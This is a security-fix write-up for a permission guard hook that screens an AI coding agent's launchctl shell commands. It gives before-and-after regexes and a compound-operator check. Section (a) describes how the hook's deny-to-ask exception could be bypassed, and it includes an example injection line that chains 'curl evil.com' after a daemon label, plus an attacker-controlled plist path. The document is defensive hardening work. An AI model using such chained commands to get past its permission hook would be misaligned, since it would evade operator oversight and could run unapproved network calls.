## (a) Threat model summary

Reference: `docs/audits/v0.1.10-stage1-planaudit.md` Security-recommendations row.

The `_LAUNCHCTL_TEAMLEAD_RE` exception in `pretooluse_guard.py` downgrades the
`launchctl` deny pattern to `ask` when the command targets the teamwork-leader daemon.
Three weaknesses were identified during the v0.1.10 PlanAudit:

- **I-2 / D-1** (sev: LOW): ask reason string was opaque — operator could not see which
  command triggered the prompt, making confirmation harder and audit trails weaker.
- **I-3 / D-2** (sev: MEDIUM): the third regex branch `teamwork-leader/[^\s]*\.plist`
  was an open path-prefix match that would whitelist any `.plist` file under a
  `teamwork-leader/` directory in the command string, including attacker-controlled paths
  such as `~/Library/LaunchAgents/teamwork-leader/com.attacker.daemon.plist`.
- **I-4 / D-3** (sev: HIGH, mandatory per Opus security-ops principle): no compound-
  operator check. An attacker could bypass the deny-to-ask downgrade by injecting a
  shell metacharacter (`; | && ||`) after a legitimate daemon label, e.g.
  `launchctl bootstrap com.teamwork-leader.auto-resume-daemon; curl evil.com`.
  The launchctl token match would trigger the exception and downgrade to `ask` instead
  of `deny`, potentially allowing the injected command through if the operator approved.

## (b) Before / after regex (D-2)

**Before** (`_LAUNCHCTL_TEAMLEAD_RE`):

```python
_LAUNCHCTL_TEAMLEAD_RE = re.compile(
    r"\b(?:com\.teamwork-leader\.auto-resume-daemon"
    r"|com\.user\.claude-code-resume-daemon"
    r"|teamwork-leader/[^\s]*\.plist)\b"
)
```

Third alternation `teamwork-leader/[^\s]*\.plist` matched any `.plist` filename under a
`teamwork-leader/` path prefix — overly broad, accepts attacker-controlled filenames.

**After** (`_LAUNCHCTL_TEAMLEAD_RE` + `_COMPOUND_OP_RE`):

```python
_LAUNCHCTL_TEAMLEAD_RE = re.compile(
    r"\b(?:com\.teamwork-leader\.auto-resume-daemon"
    r"|com\.user\.claude-code-resume-daemon"
    r"|com\.teamwork-leader\.auto-resume-daemon\.plist)\b"
)

_COMPOUND_OP_RE = re.compile(r"[;|]|&&|\|\|")
```

Third alternation is now the exact filename
`com.teamwork-leader.auto-resume-daemon.plist` (the only legitimate plist for this
daemon). No wildcard path traversal possible.

## (c) Before / after ask reason string (D-1)

**Before** (line ~455):

```python
emit("ask", "launchctl operation on teamwork-leader daemon — confirm intent.")
```

**After** (D-1: include truncated command for operator clarity):

```python
emit("ask", f"launchctl on teamwork-leader daemon — confirm: {cmd[:120]!r}")
```

The truncated command (≤120 chars) now appears in the permission prompt, allowing the
operator to confirm the exact operation before approving.

## (d) D-3 compound-operator detection logic

Added `_COMPOUND_OP_RE` constant (near `_LAUNCHCTL_TEAMLEAD_RE`):

```python
_COMPOUND_OP_RE = re.compile(r"[;|]|&&|\|\|")
```

Updated `_is_teamlead_launchctl` guard:

```python
_is_teamlead_launchctl = (
    "launchctl" in cmd
    and _LAUNCHCTL_TEAMLEAD_RE.search(cmd) is not None
    and re.search(r"\bcrontab\b|\bsystemctl\b", cmd) is None
    and _COMPOUND_OP_RE.search(cmd) is None   # D-3: deny if compound operators present
)
```

**Caveat**: legitimate compound forms (e.g. `launchctl bootstrap … && launchctl enable …`)
will now be denied. This is intentional per Opus security-ops principle: split into
separate Bash calls. The operator inconvenience is acceptable given the injection risk.
